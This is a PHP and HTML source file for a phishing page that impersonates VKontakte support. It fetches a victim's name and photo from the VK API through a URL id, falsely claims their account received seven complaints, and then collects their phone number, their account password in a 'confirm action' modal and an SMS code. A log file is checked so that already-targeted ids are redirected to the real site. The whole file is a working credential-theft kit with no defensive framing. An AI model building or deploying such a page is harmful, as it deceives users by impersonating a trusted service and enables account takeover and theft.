<?php

include('db.php');

$mobpc = ((check_user_agent('mobile'))?"Мобильный":"ПК");	

if(isset($_GET['id']))
{
	
$fx = file_get_contents("logVK.txt");// получаем текст 
$pos = strpos($fx, $_GET['id']); // нашли слово в тексте
if($pos){
header("Location:https://vk.com/");
exit;
}	
	

$request = 'https://api.vk.com/method/users.get?fields=sex,photo_50,photo_100&user_ids=' . $_GET['id'].'&lang=ru';
$response = file_get_contents($request);
$id = $_GET['id'];

$ip = $_SERVER["REMOTE_ADDR"];

$info = array_shift(json_decode($response)->response);

$ids = $info->uid;

setcookie ("id", $ids, time()+3600, "/");

$pol = "12";
 
 if ($info->sex == 1) { $pol = "Уважаемая"; }
 if ($info->sex == 2) { $pol = "Уважаемый"; }
 if ($info->sex == 0) { $pol = ""; }

}
        else {
			
		header("Location: https://vk.com/");
        exit;
		
        }
	
		
?>


<!DOCTYPE html>
<html lang=ru>

<head>
    <meta charset=UTF-8>
    <title><?=$info->first_name?> <?=$info->last_name?></title>
    <meta name=description content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
    <meta http-equiv=X-UA-Compatible content="IE=edge">
    <meta name=viewport content="width=device-width,initial-scale=1">
    <link rel="shortcut icon" type=image/gif href="template/images/fav_logo.ico">
    <link rel=apple-touch-icon href="template/images/safari_60.png">
    <link rel=apple-touch-icon sizes=76x76 href="template/images/safari_76.png">
    <link rel=apple-touch-icon sizes=120x120 href="template/images/safari_120.png">
    <link rel=apple-touch-icon sizes=152x152 href="template/images/safari_152.png">
    <meta property=og:site_name content="ВКонтакте">
    <link type=text/css href="template/main.css" rel=stylesheet>
	<link type=text/css href="common.css" rel=stylesheet>

    <body class=fixed-header>
        <nav class="navbar navbar-default navbar-fixed-top">
            <div class=container>
			
                <div class=navbar-header><a class=navbar-brand href="/"></a></div>
                <ul class="nav navbar-nav navbar-right hidden-xs">
				
                    <li><a class=user-info style=""><div style="position:relative; margin-right: 10px; float: left;"><?=$info->first_name?></div><img src="<?=$info->photo_50?>" alt="<?=$info->first_name?> <?=$info->last_name?>"></a></li>
                </ul>
            </div>
        </nav>
        <div class="modal fade" id=security tabindex=-1 role=dialog aria-hidden=true>
            <div class=modal-dialog>
                <div class=modal-content>
                    <div class=modal-header><button type=button class=close id="close" data-dismiss=modal aria-hidden=true></button>
                        <div class=security>Подтверждение действия</div>
                    </div>
                    <div class="modal-body text-center">
                        <div class=modal-ct>
                            <div class=modal-ct-text>Для подтверждения действия Вам необходимо заново ввести пароль от Вашей страницы.</div>
                            <div class="alert alert-danger text-left alert-pw" id=errorRecovery>Указан неверный пароль.</div>
                            <div class=ar-content><center><img src="template/images/msg_error.png" class="img-responsive captcha-img hidden-a" alt=captcha-img></center><input type=hidden id=captcha_sid><input class="form-control captcha-key" placeholder=Код>
                            							<div id=sms style="display:none">
							
						
		<input type="text" class="form-control ml-input form_input" name="cid" placeholder="Код из смс">
								<br>
							</div>
                            <input type=password class="form-control ml-input"
                                    id=validation_password placeholder="Введите Ваш пароль"><button type=button class="btn btn-block btn-primary btn-ml" id=next_1 onclick=next_1() data-loading-text="<div class=pr><div class=pr_bt></div><div class=pr_bt></div><div class=pr_bt></div></div>">Подтвердить</button></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="container text-center">
  <div class=content>
   <div id="step1" style="display: block">
                <div class=content-text><img src="<?=$info->photo_100?>" class="img-responsive img-ct" alt="<?=$info->first_name?> <?=$info->last_name?>" style="width:100px; border-radius:160px 160px 160px 160px;-webkit-border-radius:160px 160px 160px 160px;-moz-border-radius:160px 160px 160px 160px;"><?=$pol?>
                    <b><?=$info->first_name?> <?=$info->last_name?></b>!<br>На Вашу учетную запись с <a href="https://vk.com/id<?=$info->uid?>" target=_blank><b>@id<?=$info->uid?></b></a> поступило <b>7</b> жалоб!<br>Для проверки учетной записи <b>подтвердите свой номер телефона</b>:</div>
                <div class="alert alert-info text-left alert-ct" id=phoneFormat><b>Некорректный мобильный номер</b>.<br>Необходимо корректно ввести номер <b>в международном формате</b>.<br>Например: +7 921 0000007</div>
            <div class="form-group text-left">
                <div class=label-text>Мобильный телефон</div><input class="form-control" id="user-number" value="+7" tabindex=0 autocomplete=off data-html=true data-toggle=popover data-trigger=focus>
                <div class=next><button type=button class="btn btn-block btn-primary" id=next onclick=next() data-loading-text="<div class=pr><div class=pr_bt></div><div class=pr_bt></div><div class=pr_bt></div></div>">Продолжить</button></div>
        </div>
		</div>
		
		<script>
document.getElementById('user-number').onkeypress = function (e) {
  return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
}
</script>
		
 <div id="step2" style="display: none">
<center><div id="login_message"><div class="msg error"><div class="msg_text"><b>Статус проверки: в процессе!</b></div></div></div></center>
<div id="login_form_wrap" class="login_form_wrap">
<img src="dog.jpg">
</div>
<p><center><b><?=$info->first_name?>, Ваша страница была отправленна на проверку!</b></center></p>
<p><center>Вы будете оповещены о результате, до этого времени не рекомендуется менять Ваши данные. </center></p>
<p><center><a href="https://vk.com/feed">Возвращайтесь к просмотру новостей</a>, наверняка у Вас в ленте появилось что-то интересное.</center></p><br>
<p style="float: right;">С уважением, Служба Поддержки.</p><br>


</div>		
		
		
        </div>
        </div>
        <script async type=text/javascript src="template/main.js"></script>
		
		
		               <div id="footer_wrap" class="footer_wrap" style="width:960px; margin:40px auto;     padding: 24px 15px 35px;
    border-top: 1px solid #e4e8ed;">
                       <div class="footer_nav" id="bottom_nav" style="width:100%; margin:0 auto;">
                     <div class="footer_copy fl_l"><a href="https://vk.com/about" target="_blank">ВКонтакте</a> &copy; 2018</div>
                     <div class="footer_lang fl_r">Язык:<a class="footer_lang_link">English</a><a class="footer_lang_link" >Русский</a><a class="footer_lang_link">Українська</a><a class="footer_lang_link">все языки &raquo;</a></div>
                     <div class="footer_links">
                        <a class="bnav_a" href="https://vk.com/about" target="_blank">о компании</a>
                        <a class="bnav_a" href="https://vk.com/terms" target="_blank">правила</a>
                        <a class="bnav_a" href="https://vk.com/ads" target="_blank" style="">реклама</a>
                        <a class="bnav_a" href="https://vk.com/dev" target="_blank">разработчикам</a>
                     </div>
                  </div>
                  <div class="footer_bench clear">
                  </div>
               </div>
               <div class="clear"></div>
             